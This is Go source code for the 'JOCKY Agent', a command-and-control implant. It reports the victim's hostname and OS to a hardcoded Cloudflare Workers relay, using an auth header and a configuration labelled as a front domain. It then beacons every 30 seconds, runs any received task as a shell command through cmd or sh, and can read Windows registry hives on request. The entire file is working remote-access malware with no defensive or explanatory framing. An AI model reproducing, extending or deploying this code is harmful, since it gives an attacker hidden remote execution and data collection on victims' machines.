package main

import (
    "bytes"
    "crypto/tls"
    "encoding/json"
    "fmt"
    "net/http"
    "os"
    "os/exec"
    "runtime"
    "strings"
    "time"
    "golang.org/x/sys/windows/registry"
)

// ============================================================
// CONFIGURATION – REPLACE WITH YOUR ACTUAL VALUES
// ============================================================
const (
    LISTENER_URL = "https://jocky-relay.dm2528v.workers.dev"
    FRONT_DOMAIN = "jocky-relay.dm2528v.workers.dev"
    HOST_HEADER  = "c2-api.jocky.internal"
    C2_AUTH      = "supersecret123"
)

var AgentID = "agent-" + randomString(8)

func randomString(n int) string {
    const letters = "abcdef0123456789"
    b := make([]byte, n)
    for i := range b {
        b[i] = letters[time.Now().UnixNano()%int64(len(letters))]
    }
    return string(b)
}

type RegisterRequest struct {
    AgentID  string `json:"agent_id"`
    Hostname string `json:"hostname"`
    OS       string `json:"os"`
}

type HeartbeatRequest struct {
    AgentID string `json:"agent_id"`
}

type DeploymentResponse struct {
    Deployment *struct {
        DeployID   string `json:"deploy_id"`
        ScriptID   string `json:"script_id"`
        Code       string `json:"code"`
        HashBefore string `json:"hash_before"`
    } `json:"deployment"`
}

func main() {
    hostname, _ := os.Hostname()
    username := os.Getenv("USER")
    if runtime.GOOS == "windows" {
        username = os.Getenv("USERNAME")
    }
    osStr := runtime.GOOS + " " + runtime.GOARCH

    fmt.Printf("[+] JOCKY Agent %s started\n", AgentID)
    fmt.Printf("[+] Beaconing to: %s\n", LISTENER_URL)

    if err := registerAgent(hostname, username, osStr); err != nil {
        fmt.Printf("[!] Registration failed: %v\n", err)
    }

    for {
        task, err := sendHeartbeat()
        if err != nil {
            fmt.Printf("[!] Heartbeat error: %v\n", err)
            time.Sleep(30 * time.Second)
            continue
        }

        if task != "" {
            fmt.Printf("[TASK] Received: %s\n", task)
            result := executeJOCKY(task)
            fmt.Printf("[RESULT] %s\n", result)
        }

        time.Sleep(30 * time.Second)
    }
}

// ============================================================
// JOCKY SCRIPT PARSER (IMPROVED)
// ============================================================

func executeJOCKY(script string) string {
    script = strings.TrimSpace(script)

    // If it's a plain command (no curly braces), run as shell
    if !strings.Contains(script, "agent") && !strings.Contains(script, "{") {
        return runShellCommand(script)
    }

    // Try to extract exec("...") or exec('...')
    if strings.Contains(script, "exec(") {
        start := strings.Index(script, "exec(")
        if start != -1 {
            start += 5 // len("exec(")
            if start < len(script) && (script[start] == '"' || script[start] == '\'') {
                quote := script[start]
                end := strings.Index(script[start+1:], string(quote))
                if end != -1 {
                    cmd := script[start+1 : start+1+end]
                    return runShellCommand(cmd)
                }
            }
        }
    }

    // Try to extract collect_registry("...")
    if strings.Contains(script, "collect_registry(") {
        start := strings.Index(script, "collect_registry(")
        if start != -1 {
            start += len("collect_registry(")
            if start < len(script) && (script[start] == '"' || script[start] == '\'') {
                quote := script[start]
                end := strings.Index(script[start+1:], string(quote))
                if end != -1 {
                    path := script[start+1 : start+1+end]
                    // Replace double backslashes with single (they are escaped in the JSON)
                    path = strings.ReplaceAll(path, "\\\\", "\\")
                    return collectRegistry(path)
                }
            }
        }
    }

    // Fallback: try to run the whole script as a command
    return runShellCommand(script)
}

func runShellCommand(cmdStr string) string {
    const errPrefix = "error: "
    var cmd *exec.Cmd
    if runtime.GOOS == "windows" {
        cmd = exec.Command("cmd", "/c", cmdStr)
    } else {
        cmd = exec.Command("sh", "-c", cmdStr)
    }
    out, err := cmd.Output()
    if err != nil {
        return errPrefix + err.Error()
    }
    return string(out)
}

func collectRegistry(path string) string {
    if runtime.GOOS != "windows" {
        return "Registry access only supported on Windows"
    }

    parts := strings.SplitN(path, "\\", 2)
    if len(parts) != 2 {
        return "error: invalid registry path format"
    }
    hiveStr, keyPath := parts[0], parts[1]

    var hive registry.Key
    switch strings.ToUpper(hiveStr) {
    case "HKLM":
        hive = registry.LOCAL_MACHINE
    case "HKCU":
        hive = registry.CURRENT_USER
    case "HKCR":
        hive = registry.CLASSES_ROOT
    case "HKU":
        hive = registry.USERS
    case "HKCC":
        hive = registry.CURRENT_CONFIG
    default:
        return "error: unknown hive " + hiveStr
    }

    key, err := registry.OpenKey(hive, keyPath, registry.READ)
    if err != nil {
        return "error: " + err.Error()
    }
    defer key.Close()

    valueNames, err := key.ReadValueNames(0)
    if err != nil {
        return "error: " + err.Error()
    }

    var result strings.Builder
    for _, name := range valueNames {
        val, _, err := key.GetStringValue(name)
        if err != nil {
            continue
        }
        result.WriteString(fmt.Sprintf("%s: %s\n", name, val))
    }
    return result.String()
}

// ============================================================
// REGISTRATION AND HEARTBEAT (unchanged)
// ============================================================
func registerAgent(hostname, username, osStr string) error {
    reqBody := RegisterRequest{
        AgentID:  AgentID,
        Hostname: hostname,
        OS:       osStr,
    }
    body, _ := json.Marshal(reqBody)
    url := LISTENER_URL + "/api/v1/agent/register"
    fmt.Printf("[DEBUG] Registering at: %s\n", url)

    req, err := http.NewRequest("POST", url, bytes.NewReader(body))
    if err != nil {
        return err
    }
    req.Header.Set("X-C2-Auth", C2_AUTH)
    req.Header.Set("Host", FRONT_DOMAIN)
    req.Header.Set("Content-Type", "application/json")

    client := &http.Client{
        Timeout: 10 * time.Second,
        Transport: &http.Transport{
            TLSClientConfig: &tls.Config{
                ServerName: FRONT_DOMAIN,
            },
        },
    }

    resp, err := client.Do(req)
    if err != nil {
        return err
    }
    defer resp.Body.Close()

    if resp.StatusCode != http.StatusOK && resp.StatusCode != http.StatusCreated {
        return fmt.Errorf("registration failed: %d", resp.StatusCode)
    }
    fmt.Println("[+] Registration successful")
    return nil
}

func sendHeartbeat() (string, error) {
    reqBody := HeartbeatRequest{AgentID: AgentID}
    body, _ := json.Marshal(reqBody)
    url := LISTENER_URL + "/api/v1/agent/heartbeat"
    fmt.Printf("[DEBUG] Heartbeat to: %s\n", url)

    req, err := http.NewRequest("POST", url, bytes.NewReader(body))
    if err != nil {
        return "", err
    }
    req.Header.Set("X-C2-Auth", C2_AUTH)
    req.Header.Set("Host", FRONT_DOMAIN)
    req.Header.Set("Content-Type", "application/json")

    client := &http.Client{
        Timeout: 10 * time.Second,
        Transport: &http.Transport{
            TLSClientConfig: &tls.Config{
                ServerName: FRONT_DOMAIN,
            },
        },
    }

    resp, err := client.Do(req)
    if err != nil {
        return "", err
    }
    defer resp.Body.Close()

    if resp.StatusCode != http.StatusOK {
        return "", fmt.Errorf("heartbeat failed: %d", resp.StatusCode)
    }

    var deploymentResp DeploymentResponse
    if err := json.NewDecoder(resp.Body).Decode(&deploymentResp); err != nil {
        return "", err
    }

    if deploymentResp.Deployment != nil {
        return deploymentResp.Deployment.Code, nil
    }
    return "", nil
}